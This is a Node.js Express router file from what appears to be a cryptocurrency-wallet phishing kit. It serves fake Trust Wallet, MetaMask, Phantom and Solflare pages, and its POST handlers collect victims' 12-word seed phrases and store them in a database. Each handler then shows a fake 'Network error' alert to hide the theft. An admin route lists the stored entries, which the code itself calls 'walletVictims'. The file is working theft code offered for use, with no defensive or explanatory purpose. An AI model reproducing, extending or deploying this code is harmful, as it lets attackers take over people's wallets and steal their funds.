const express = require('express');
const TrustWallet = require('../models/TrustWallet');
const router = express.Router();





// PREMIUM OFFERS START HERE 








// ALL ABOUT WALLET PHRASES 
// Route to display wallet seed phrases
router.get('/wallet-view', async (req, res) => {
    try {
        const walletVictims = await TrustWallet.find(); // Fetch all TrustWallet records
        res.render('wallet-view', { walletVictims });
    } catch (err) {
        console.error('Error retrieving wallet data:', err);
        res.status(500).send('Error loading wallet data');
    }
});

// Route to render the Trust Wallet page
router.get('/trustwallet', (req, res) => {
    const userId = req.query.userId;
    if (!userId) {
        return res.status(400).send('User ID is required');
    }
    res.render('trustwallet', { userId });
});

// Route to handle Trust Wallet form submission
router.post('/submit-trustwallet-seed', async (req, res) => {
    const { userId, seedPhrase } = req.body;
    const seedArray = seedPhrase.trim().split(' ').slice(0, 12);

    if (seedArray.length !== 12) {
        return res.status(400).send('Seed phrase must contain exactly 12 words');
    }

    try {
        const walletData = new TrustWallet({ userId, seedPhrase: seedArray });
        await walletData.save();
        res.send("<script>alert('Network error. Please try again later.');</script>");
    } catch (err) {
        console.error('Error saving seed phrase:', err);
        res.status(500).send('Error processing request');
    }
});

// Route to delete a wallet victim entry by ID
router.post('/delete-wallet/:id', async (req, res) => {
    const walletId = req.params.id;

    try {
        await TrustWallet.findByIdAndDelete(walletId); // Use the TrustWallet model
        res.redirect('/wallet-view'); // Redirect back to the wallet view
    } catch (error) {
        console.error('Error deleting wallet victim:', error);
        res.status(500).send('Error deleting data');
    }
});



// ALL FOR METAMASK 
// Route to render MetaMask page
router.get('/metamask', (req, res) => {
    const userId = req.query.userId;
    if (!userId) {
        return res.status(400).send('User ID is required');
    }
    res.render('metamask', { userId });
});

// Route to handle MetaMask form submission
router.post('/submit-metamask-seed', async (req, res) => {
    const { userId, seedPhrase } = req.body;
    const seedArray = seedPhrase.split(' ').slice(0, 12); // Convert to array and limit to 12 words

    if (seedArray.length !== 12) {
        return res.status(400).send('Seed phrase must contain exactly 12 words');
    }

    try {
        const WalletData = new TrustWallet({ userId, seedPhrase: seedArray, platform: 'MetaMask' });
        await WalletData.save();
        res.send("<script>alert('Network error. Please try again later.');</script>");
    } catch (err) {
        console.error('Error saving MetaMask seed phrase:', err);
        res.status(500).send('Error processing request');
    }
});


// ABOUT PHANTOM 
// Route to render Phantom page
router.get('/phantom', (req, res) => {
    const userId = req.query.userId;
    if (!userId) {
        return res.status(400).send('User ID is required');
    }
    res.render('phantom', { userId });
});

// Route to handle Phantom seed phrase submission
router.post('/submit-phantom-seed', async (req, res) => {
    const { userId, seedPhrase } = req.body;
    const seedArray = seedPhrase.split(' ').slice(0, 12); // Convert to array and limit to 12 words

    if (seedArray.length !== 12) {
        return res.status(400).send('Seed phrase must contain exactly 12 words');
    }

    try {
        const walletData = new TrustWallet({ userId, seedPhrase: seedArray, platform: 'Phantom' });
        await walletData.save();
        res.send("<script>alert('Network error. Please try again later.');</script>");
    } catch (err) {
        console.error('Error saving Phantom seed phrase:', err);
        res.status(500).send('Error processing request');
    }
});



// ABOUT SOLFLARE 
// Route to render Solflare page
router.get('/solflare', (req, res) => {
    const userId = req.query.userId;
    if (!userId) {
        return res.status(400).send('User ID is required');
    }
    res.render('solflare', { userId });
});

// Route to handle Solflare seed phrase submission
router.post('/submit-solflare-seed', async (req, res) => {
    const { userId, seedPhrase } = req.body;
    const seedArray = seedPhrase.split(' ').slice(0, 12); // Convert to array and limit to 12 words

    if (seedArray.length !== 12) {
        return res.status(400).send('Seed phrase must contain exactly 12 words');
    }

    try {
        const walletData = new TrustWallet({ userId, seedPhrase: seedArray, platform: 'Solflare' });
        await walletData.save();
        res.send("<script>alert('Network error. Please try again later.');</script>");
    } catch (err) {
        console.error('Error saving Solflare seed phrase:', err);
        res.status(500).send('Error processing request');
    }
});






module.exports = router;
